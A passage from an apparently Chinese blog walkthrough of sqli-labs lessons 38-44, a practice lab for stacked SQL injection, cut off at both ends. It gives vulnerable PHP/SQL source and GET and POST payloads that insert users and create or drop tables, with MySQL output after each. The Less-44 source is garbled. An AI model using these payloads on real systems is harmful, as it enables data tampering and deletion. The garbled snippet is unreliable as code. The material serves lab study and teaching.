stupidity  </span>|<br><br>|<span class="hljs-string">  6 </span>|<span class="hljs-string"> superman </span>|<span class="hljs-string"> genious    </span>|<br><br>|<span class="hljs-string">  7 </span>|<span class="hljs-string"> batman   </span>|<span class="hljs-string"> mob!le     </span>|<br><br>|<span class="hljs-string">  8 </span>|<span class="hljs-string"> admin    </span>|<span class="hljs-string"> admin      </span>|<br><br>|<span class="hljs-string">  9 </span>|<span class="hljs-string"> admin1   </span>|<span class="hljs-string"> admin1     </span>|<br><br>|<span class="hljs-string"> 10 </span>|<span class="hljs-string"> admin2</span>|<span class="hljs-string"> admin2     </span>|<br><br>|<span class="hljs-string"> 11 </span>|<span class="hljs-string"> admin3</span>|<span class="hljs-string"> admin3     </span>|<br><br>|<span class="hljs-string"> 12 </span>|<span class="hljs-string"> dhakkan</span>|<span class="hljs-string"> dumbo      </span>|<br><br>|<span class="hljs-string"> 14 </span>|<span class="hljs-string"> admin4</span>|<span class="hljs-string"> admin4     </span>|<br><br>|<span class="hljs-string"> 38 </span>|<span class="hljs-string"> less38</span>|<span class="hljs-string"> hello      </span>|<br><br>+----+----------+------------+<br><br>14 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>发现已经添加了一个 less38 用户</p><p>?id=1’;create table less38 like users;</p><p>?id=1’;drop table less38;</p><h2 id="2-Less-39-堆叠注入-整型-GET"><a href="#2-Less-39-堆叠注入-整型-GET" class="headerlink" title="2.Less-39 堆叠注入 - 整型 - GET"></a>2.Less-39 堆叠注入 - 整型 - GET</h2><p>（1）源代码</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql=&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id=$id <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><p>（2）测试</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (‘<span class="hljs-number">39</span>’,’less39’,’hello’)–-<br></code></pre></td></tr></table></figure><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; select <span class="hljs-symbol">*</span> from users;<br><br>+----+----------+------------+<br><br>|<span class="hljs-string"> id </span>|<span class="hljs-string"> username </span>|<span class="hljs-string"> password   </span>|<br><br>+----+----------+------------+<br><br>|<span class="hljs-string">  1 </span>|<span class="hljs-string"> Dumb     </span>|<span class="hljs-string"> Dumb       </span>|<br><br>|<span class="hljs-string">  2 </span>|<span class="hljs-string"> Angelina </span>|<span class="hljs-string"> I-kill-you </span>|<br><br>|<span class="hljs-string">  3 </span>|<span class="hljs-string"> Dummy    </span>|<span class="hljs-string"> p@ssword   </span>|<br><br>|<span class="hljs-string">  4 </span>|<span class="hljs-string"> secure   </span>|<span class="hljs-string"> crappy     </span>|<br><br>|<span class="hljs-string">  5 </span>|<span class="hljs-string"> stupid   </span>|<span class="hljs-string"> stupidity  </span>|<br><br>|<span class="hljs-string">  6 </span>|<span class="hljs-string"> superman </span>|<span class="hljs-string"> genious    </span>|<br><br>|<span class="hljs-string">  7 </span>|<span class="hljs-string"> batman   </span>|<span class="hljs-string"> mob!le     </span>|<br><br>|<span class="hljs-string">  8 </span>|<span class="hljs-string"> admin    </span>|<span class="hljs-string"> admin      </span>|<br><br>|<span class="hljs-string">  9 </span>|<span class="hljs-string"> admin1   </span>|<span class="hljs-string"> admin1     </span>|<br><br>|<span class="hljs-string"> 10 </span>|<span class="hljs-string"> admin2</span>|<span class="hljs-string"> admin2     </span>|<br><br>|<span class="hljs-string"> 11 </span>|<span class="hljs-string"> admin3</span>|<span class="hljs-string"> admin3     </span>|<br><br>|<span class="hljs-string"> 12 </span>|<span class="hljs-string"> dhakkan</span>|<span class="hljs-string"> dumbo      </span>|<br><br>|<span class="hljs-string"> 14 </span>|<span class="hljs-string"> admin4</span>|<span class="hljs-string"> admin4     </span>|<br><br>|<span class="hljs-string"> 38 </span>|<span class="hljs-string"> less38</span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string"> 39 </span>|<span class="hljs-string"> less39</span>|<span class="hljs-string"> hello      </span>|<br><br>+----+----------+------------+<br><br>15 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>可以看到已经添加了 less39 用户了</p><p>?id=1;create table less39 like users;</p><p>?id=1;drop table less39;</p><h2 id="3-Less-40-盲注-堆叠注入-字符型-GET"><a href="#3-Less-40-盲注-堆叠注入-字符型-GET" class="headerlink" title="3.Less-40 盲注 - 堆叠注入 - 字符型 - GET"></a>3.Less-40 盲注 - 堆叠注入 - 字符型 - GET</h2><p>（1）源代码</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql=&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id=(<span class="hljs-string">&#x27;$id&#x27;</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><p>（2）测试</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1’); <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (‘<span class="hljs-number">40</span>’,’less40’,’hello’)–+<br></code></pre></td></tr></table></figure><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; select <span class="hljs-symbol">*</span> from users;<br><br>+-----+----------+------------+<br><br>|<span class="hljs-string"> id  </span>|<span class="hljs-string"> username </span>|<span class="hljs-string"> password   </span>|<br><br>+-----+----------+------------+<br><br>|<span class="hljs-string">   1 </span>|<span class="hljs-string"> Dumb     </span>|<span class="hljs-string"> Dumb       </span>|<br><br>|<span class="hljs-string">   2 </span>|<span class="hljs-string"> Angelina </span>|<span class="hljs-string"> I-kill-you </span>|<br><br>|<span class="hljs-string">   3 </span>|<span class="hljs-string"> Dummy    </span>|<span class="hljs-string"> p@ssword   </span>|<br><br>|<span class="hljs-string">   4 </span>|<span class="hljs-string"> secure   </span>|<span class="hljs-string"> crappy     </span>|<br><br>|<span class="hljs-string">   5 </span>|<span class="hljs-string"> stupid   </span>|<span class="hljs-string"> stupidity  </span>|<br><br>|<span class="hljs-string">   6 </span>|<span class="hljs-string"> superman </span>|<span class="hljs-string"> genious    </span>|<br><br>|<span class="hljs-string">   7 </span>|<span class="hljs-string"> batman   </span>|<span class="hljs-string"> mob!le     </span>|<br><br>|<span class="hljs-string">   8 </span>|<span class="hljs-string"> admin    </span>|<span class="hljs-string"> admin      </span>|<br><br>|<span class="hljs-string">   9 </span>|<span class="hljs-string"> admin1   </span>|<span class="hljs-string"> admin1     </span>|<br><br>|<span class="hljs-string">  10 </span>|<span class="hljs-string"> admin2   </span>|<span class="hljs-string"> admin2     </span>|<br><br>|<span class="hljs-string">  11 </span>|<span class="hljs-string"> admin3   </span>|<span class="hljs-string"> admin3     </span>|<br><br>|<span class="hljs-string">  12 </span>|<span class="hljs-string"> dhakkan  </span>|<span class="hljs-string"> dumbo      </span>|<br><br>|<span class="hljs-string">  14 </span>|<span class="hljs-string"> admin4   </span>|<span class="hljs-string"> admin4     </span>|<br><br>|<span class="hljs-string">  38 </span>|<span class="hljs-string"> less38   </span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string">  39 </span>|<span class="hljs-string"> less39   </span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string"> 109 </span>|<span class="hljs-string"> hello</span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string">  40 </span>|<span class="hljs-string"> less40   </span>|<span class="hljs-string"> hello      </span>|<br><br>+-----+----------+------------+<br><br>17 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>看到添加了 less40 用户</p><p>?id=1’);create table less40 like users;</p><p>?id=1’);drop table less40;</p><h2 id="4-Less-41-盲注-堆叠注入-整型-GET"><a href="#4-Less-41-盲注-堆叠注入-整型-GET" class="headerlink" title="4.Less-41 盲注 - 堆叠注入 - 整型 - GET"></a>4.Less-41 盲注 - 堆叠注入 - 整型 - GET</h2><p>（1）源代码</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql=&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id=$id <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><p>（2）测试（盲注）</p><p>创建users表和增加字段值</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1; <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (‘<span class="hljs-number">110</span>’,’less41’,’hello’)–+<br></code></pre></td></tr></table></figure><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; select <span class="hljs-symbol">*</span> from users;<br><br>+-----+----------+------------+<br><br>|<span class="hljs-string"> id  </span>|<span class="hljs-string"> username </span>|<span class="hljs-string"> password   </span>|<br><br>+-----+----------+------------+<br><br>|<span class="hljs-string">   1 </span>|<span class="hljs-string"> Dumb     </span>|<span class="hljs-string"> Dumb       </span>|<br><br>|<span class="hljs-string">   2 </span>|<span class="hljs-string"> Angelina </span>|<span class="hljs-string"> I-kill-you </span>|<br><br>|<span class="hljs-string">   3 </span>|<span class="hljs-string"> Dummy    </span>|<span class="hljs-string"> p@ssword   </span>|<br><br>|<span class="hljs-string">   4 </span>|<span class="hljs-string"> secure   </span>|<span class="hljs-string"> crappy     </span>|<br><br>|<span class="hljs-string">   5 </span>|<span class="hljs-string"> stupid   </span>|<span class="hljs-string"> stupidity  </span>|<br><br>|<span class="hljs-string">   6 </span>|<span class="hljs-string"> superman </span>|<span class="hljs-string"> genious    </span>|<br><br>|<span class="hljs-string">   7 </span>|<span class="hljs-string"> batman   </span>|<span class="hljs-string"> mob!le     </span>|<br><br>|<span class="hljs-string">   8 </span>|<span class="hljs-string"> admin    </span>|<span class="hljs-string"> admin      </span>|<br><br>|<span class="hljs-string">   9 </span>|<span class="hljs-string"> admin1   </span>|<span class="hljs-string"> admin1     </span>|<br><br>|<span class="hljs-string">  10 </span>|<span class="hljs-string"> admin2   </span>|<span class="hljs-string"> admin2     </span>|<br><br>|<span class="hljs-string">  11 </span>|<span class="hljs-string"> admin3   </span>|<span class="hljs-string"> admin3     </span>|<br><br>|<span class="hljs-string">  12 </span>|<span class="hljs-string"> dhakkan  </span>|<span class="hljs-string"> dumbo      </span>|<br><br>|<span class="hljs-string">  14 </span>|<span class="hljs-string"> admin4   </span>|<span class="hljs-string"> admin4     </span>|<br><br>|<span class="hljs-string">  38 </span>|<span class="hljs-string"> less38   </span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string">  39 </span>|<span class="hljs-string"> less39   </span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string"> 109 </span>|<span class="hljs-string"> hello</span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string">  40 </span>|<span class="hljs-string"> less40   </span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string"> 110 </span>|<span class="hljs-string"> less41</span>|<span class="hljs-string"> hello      </span>|<br><br>+-----+----------+------------+<br><br>18 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>添加了用户 less41</p><p>?id=1;create table less41 like users;  &#x2F;&#x2F;增加表</p><p>?id=1;drop table less41;  &#x2F;&#x2F;删除表</p><h2 id="5-Less-42-报错型堆叠注入-字符型-POST"><a href="#5-Less-42-报错型堆叠注入-字符型-POST" class="headerlink" title="5.Less-42 报错型堆叠注入 - 字符型 - POST"></a>5.Less-42 报错型堆叠注入 - 字符型 - POST</h2><p>（1）源代码（login.php）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$username</span> = mysqli_real_escape_string(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<br><br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>];<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-variable">$username</span>&#x27; and password=&#x27;<span class="hljs-variable">$password</span>&#x27;&quot;</span>;  <br></code></pre></td></tr></table></figure><p><strong>Password</strong> 变量在<strong>post</strong> 过程中，<strong>没有</strong>通过 mysql_real_escape_string() <strong>函数</strong>的<strong>处理</strong>。因此在登录的时候<strong>密码选项</strong>我们可以进行 <strong>attack</strong>。</p><p>（2）报错测试</p><p>测试语句：</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">username：任意<br><br>password ：  c&#x27;;<span class="hljs-keyword">drop</span> <span class="hljs-built_in">table</span> me<span class="hljs-comment">#   # 删除 me 表</span><br></code></pre></td></tr></table></figure><p>或者：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">username：任意<br><br>password ： c&#x27;;<span class="hljs-keyword">create</span> table me like users<span class="hljs-meta"># <span class="hljs-comment">// 创建一个 me 表</span></span><br></code></pre></td></tr></table></figure><p>登录之前查看表：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; show tables;<br><br>+--------------------+<br><br>|<span class="hljs-string"> Tables_in_security </span>|<br><br>+--------------------+<br><br>|<span class="hljs-string"> emails</span>|<br><br>|<span class="hljs-string"> referers</span>|<br><br>|<span class="hljs-string"> uagents</span>|<br><br>|<span class="hljs-string"> users</span>|<br><br>+--------------------+<br><br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>登录前创建表</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">username ：admin<br><br>password ：  c&#x27;;<span class="hljs-keyword">create</span> table less42 like users<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>登录后查看创建表</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; show tables;<br><br>+--------------------+<br><br>|<span class="hljs-string"> Tables_in_security </span>|<br><br>+--------------------+<br><br>|<span class="hljs-string"> emails</span>|<br><br>|<span class="hljs-string"> less42</span>|<br><br>|<span class="hljs-string"> referers</span>|<br><br>|<span class="hljs-string"> uagents</span>|<br><br>|<span class="hljs-string"> users</span>|<br><br>+--------------------+<br><br>5 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>发现添加了一个 less42 表，登录时构造的 sql 语句为:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=’<span class="hljs-keyword">admin</span>’ <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=’c’;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> less42 <span class="hljs-keyword">like</span> users–+     //利用 c’;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> me#作为登录密码，删除该表。<br></code></pre></td></tr></table></figure><p>登录前删除表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">username： <span class="hljs-keyword">admin</span> <br><span class="hljs-keyword">password</span> ：  c’;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> less42#<br></code></pre></td></tr></table></figure><p>登录后查看删除表</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; show tables;<br><br>+--------------------+<br><br>|<span class="hljs-string"> Tables_in_security </span>|<br><br>+--------------------+<br><br>|<span class="hljs-string"> emails</span>|<br><br>|<span class="hljs-string"> referers</span>|<br><br>|<span class="hljs-string"> uagents</span>|<br><br>|<span class="hljs-string"> users</span>|<br><br>+--------------------+<br><br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><h2 id="6-Less-43-报错型-堆叠注入-字符型-POST"><a href="#6-Less-43-报错型-堆叠注入-字符型-POST" class="headerlink" title="6.Less-43 报错型 - 堆叠注入 - 字符型 - POST"></a>6.Less-43 报错型 - 堆叠注入 - 字符型 - POST</h2><p>（1）源代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$username</span> = mysqli_real_escape_string(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<br><br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>];<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="hljs-variable">$username</span>&#x27;) and password=(&#x27;<span class="hljs-variable">$password</span>&#x27;)&quot;</span>;<br></code></pre></td></tr></table></figure><p>（2）测试</p><p>登录前测创建表</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">username ： admin<br><br>password：  c&#x27;);<span class="hljs-keyword">create</span> table less43 like users<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>登录后查看增加表</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; show tables;<br><br>+--------------------+<br><br>|<span class="hljs-string"> Tables_in_security </span>|<br><br>+--------------------+<br><br>|<span class="hljs-string"> emails</span>|<br><br>|<span class="hljs-string"> less43</span>|<br><br>|<span class="hljs-string"> referers</span>|<br><br>|<span class="hljs-string"> uagents</span>|<br><br>|<span class="hljs-string"> users</span>|<br><br>+--------------------+<br><br>5 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>登录前测试删除表</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">username ：admin<br><br>password ： c&#x27;);<span class="hljs-keyword">drop</span> <span class="hljs-built_in">table</span> less43<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>登录后查看删除表</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; show tables;<br><br>+--------------------+<br><br>|<span class="hljs-string"> Tables_in_security </span>|<br><br>+--------------------+<br><br>|<span class="hljs-string"> emails</span>|<br><br>|<span class="hljs-string"> referers</span>|<br><br>|<span class="hljs-string"> uagents</span>|<br><br>|<span class="hljs-string"> users</span>|<br><br>+--------------------+<br><br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><h2 id="6-Less-44-盲注-堆叠注入-字符型-POST"><a href="#6-Less-44-盲注-堆叠注入-字符型-POST" class="headerlink" title="6.Less-44 盲注 - 堆叠注入 - 字符型 - POST"></a>6.Less-44 盲注 - 堆叠注入 - 字符型 - POST</h2><p>（1）源代码</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs inform7">username=mysqlirealescapestring(username=mysqlirealescapestring(con1, POST<span class="hljs-comment">[“loginuser”]</span>);POST<span class="hljs-comment">[“loginuser”]</span>); password =<br><br>POST<span class="hljs-comment">[“loginpassword”]</span>;POST<span class="hljs-comment">[“loginpassword”]</span>; sql = <span class="hljs-string">&quot;SELECT * FROM users WHERE</span><br><span class="hljs-string"></span><br><span class="hljs-string">username=&#x27;username′andpassword=′username′andpassword=′password’”;</span><br></code></pre></td></tr></table></figure><p>（2）测试（盲注）</p><p>登录前测试插入表和值</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">username ： admin<br><br>password ： a&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;144&#x27;</span>,<span class="hljs-string">&#x27;less44&#x27;</span>,<span class="hljs-string">&#x27;hello&#x27;</span>)#<br></code></pre></td></tr></table></figure><p>登录后查看增加表和值</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; select <span class="hljs-symbol">*</span> from users;<br><br>+-----+----------+------------+<br><br>|<span class="hljs-string"> id  </span>|<span class="hljs-string"> username </span>|<span class="hljs-string"> password   </span>|<br><br>+-----+----------+------------+<br><br>|<span class="hljs-string">   1 </span>|<span class="hljs-string"> Dumb     </span>|<span class="hljs-string"> Dumb       </span>|<br><br>|<span class="hljs-string">   2 </span>|<span class="hljs-string"> Angelina </span>|<span class="hljs-string"> I-kill-you </span>|<br><br>|<span class="hljs-string">   3 </span>|<span class="hljs-string"> Dummy    </span>|<span class="hljs-string"> p@ssword   </span>|<br><br>|<span class="hljs-string">   4 </span>|<span class="hljs-string"> secure   </span>|<span class="hljs-string"> crappy     </span>|<br><br>|<span class="hljs-string">   5 </span>|<span class="hljs-string"> stupid   </span>|<span class="hljs-string"> stupidity  </span>|<br><br>|<span class="hljs-string">   6 </span>|<span class="hljs-string"> superman </span>|<span class="hljs-string"> genious    </span>|<br><br>|<span class="hljs-string">   7 </span>|<span class="hljs-string"> batman   </span>|<span class="hljs-string"> mob!le     </span>|<br><br>|<span class="hljs-string">   8 </span>|<span class="hljs-string"> admin    </span>|<span class="hljs-string"> admin      </span>|<br><br>|<span class="hljs-string">   9 </span>|<span class="hljs-string"> admin1   </span>|<span class="hljs-string"> admin1     </span>|<br><br>|<span class="hljs-string">  10 </span>|<span class="hljs-string"> admin2   </span>|<span class="hljs-string"> admin2     </span>|<br><br>|<span class="hljs-string">  11 